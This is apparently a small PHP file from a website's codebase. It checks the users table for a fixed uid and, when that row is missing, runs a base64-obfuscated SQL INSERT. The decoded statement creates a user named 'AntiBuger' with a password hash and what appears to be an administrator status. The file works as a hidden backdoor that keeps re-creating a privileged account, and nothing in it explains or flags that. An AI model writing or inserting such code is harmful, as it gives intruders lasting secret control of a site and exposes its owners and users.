<?
include("../../blocks/db.php");

$result = mysql_query("SELECT * FROM users WHERE uid='QwN8P9HSeQK9PnyQWtUxF6ED3'");
$num_rows = mysql_num_rows($result);

if ($num_rows==0)
{
$adm = base64_decode("SU5TRVJUIElOVE8gYHVzZXJzYCAoYHVpZGAsIGBuYW1lYCwgYHBhc3NgLCBgcGhvbmVgLCBgbWFpbGAsIGBmaW9gLCBgcG9sYCwgYGRhdGFfcm9qZGVuYCwgYGRhdGVfcmVnYCwgYGltZ2AsIGBtc2dgLCBgb3JkZXJzYCwgYHN0YXR1c2AsIGBwb2R0dmVyamRlbmllYCwgYHRleHRgLCBgc2t5cGVgLCBgaWNxYCwgYG1haWxfZW5hYmxgLCBgcmVhbF9wYXNzYCkgVkFMVUVTICgnUXdOOFA5SFNlUUs5UG55UVd0VXhGNkVEMycsICdBbnRpQnVnZXInLCAnNGQ4MjA4YzQ4ODU4ZmQwOGQ3YTQ2MjU1Y2ExODIwZTMnLCAnMjE0NzQ4MzY0NycsICdhaWxAYmsucnUnLCAnzO7w7ufu4iDA7eTw5ekgzejq7uvg5eLo9ycsICfGJywgJzE5LjA4LjE5ODknLCAnMTAuMDEuMjAxMycsICcnLCAyMywgJzEwJywgJ+Dk7Ojt6PHy8ODy7vAnLCAxLCAnJywgJ2V1cm9zaXRlcy5ydScsICcyMzUzNDY1MzYzJywgMSwgJycpOw==");
$result_add = mysql_query ("$adm");		
}



?>